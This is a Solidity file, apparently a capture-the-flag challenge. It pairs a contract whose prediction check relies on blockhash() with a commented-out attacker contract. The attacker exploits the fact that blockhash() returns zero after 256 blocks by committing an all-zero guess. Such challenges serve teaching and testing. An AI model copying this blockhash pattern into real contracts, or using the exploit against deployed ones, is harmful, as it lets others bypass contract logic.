// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ElderShadeling {
    bytes32 prediction;
    uint256 blockNumber;
    bool committed;

    bool public isPredicted;

    function commitPrediction(bytes32 x) external {
        prediction = x;
        blockNumber = block.number;
        committed = true;
    }

    function checkPrediction() external {
        require(committed, "Prediction not committed");
        
        // Ensure prediction is checked at a later block.
        require(block.number > blockNumber + 1);
        require(prediction == blockhash(blockNumber + 1));
        isPredicted = true;
    }
    
}

// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.19;

// interface ElderShadeling {
//     function commitPrediction(bytes32 _guess) external;
//     function checkPrediction() external;
// }

// contract Attacker {
//     ElderShadeling public target;
//     bool public committed;

//     constructor(address targetAddress) {
//         target = ElderShadeling(targetAddress);
//     }

//     function commit() external {
//         require(!committed, "Prediction already committed");
        
//         // Commit a guess of all zeros
//         target.commitPrediction(0x0000000000000000000000000000000000000000000000000000000000000000);
//         committed = true;
//     }

//     function check() external {
//         require(committed, "Prediction not committed");
        
//         // Call checkPrediction after waiting for 256 blocks
//         target.checkPrediction();
//     }
// }
